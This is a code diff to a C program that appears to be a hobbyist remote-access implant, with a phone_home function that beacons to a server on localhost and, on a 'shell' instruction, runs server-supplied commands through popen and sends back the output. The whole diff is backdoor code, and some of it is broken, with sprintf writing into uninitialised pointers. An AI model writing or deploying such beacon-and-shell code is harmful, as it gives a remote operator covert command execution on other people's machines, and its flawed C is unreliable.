@@ -76,7 +76,7 @@ char * phone_home(int first_connection, char * client_id) {
 
     //here's that structure again, it's very similar to accessing a variable to another function in python (functionname.variable)
     serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(8092);
+    serv_addr.sin_port = htons(8095);
        
     // convert IPv4 and IPv6 addresses from text to binary form
     if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0) { //does some conversion, not 100% the logic behind it
@@ -106,10 +106,13 @@ char * phone_home(int first_connection, char * client_id) {
     //send_response(sock, hello);
     
     //// initial Contact
-    printf("%i\n", first_connection);
+    /*printf("%i\n", first_connection);
     if ( first_connection == 0 ) {
         send_response(sock, client_id);
         return "continue";
+    }*/
+
+    if ( 1 == 2){
     }
 
     else {
@@ -119,7 +122,7 @@ char * phone_home(int first_connection, char * client_id) {
         printf("Sending heartbeat");
         valread = read(sock, buffer, 1024);
 
-        printf("BUFFER: %s\n", buffer);
+        printf("RECEIVED BACK: %s\n", buffer);
     }
 
     ///// Decision tree
@@ -128,15 +131,10 @@ char * phone_home(int first_connection, char * client_id) {
         printf("Server Connected, but no instructions");
     }
 
-    else if ( strcmp(buffer, "wait" ) == 0 ) {
-        printf("SERVER SAYS: WAIT\n");
-        close(sock);
-        return "continue";
-    }
-
-
     else if ( strcmp(buffer, "shell" ) == 0 ) {
         printf("SERVER SAYS: SHELL");
+        send_response(sock, "shell_ready");
+        
         while (valread) {
             printf("DEBUG: waiting on server input ==============\n");
 
@@ -158,11 +156,19 @@ char * phone_home(int first_connection, char * client_id) {
         }
     }
 
+
+    else {
+        printf("WAITING AS NO COMMANDS WERE RECIEVED\n");
+        close(sock);
+        return "continue";
+    }
+
+    /*
     else {
         char * return_val;
         sprintf(return_val, "Server Connected, instruction '%s' unknown, or not valid\n", buffer);
         return return_val;
-    }
+    }*/
 
     // closing sock 
     //close(sock);
@@ -185,7 +191,11 @@ int send_response(int sock, char *response) {
 }
 
 
-char* run_command(char* command) {
+char* run_command(char* raw_command) {
+    char * command;
+    // adding error redirect to all commands
+    sprintf(command, "%s 2>&1", raw_command);
+
     FILE* pipe = popen(command, "r");
     if (!pipe) {
         perror("popen failed");
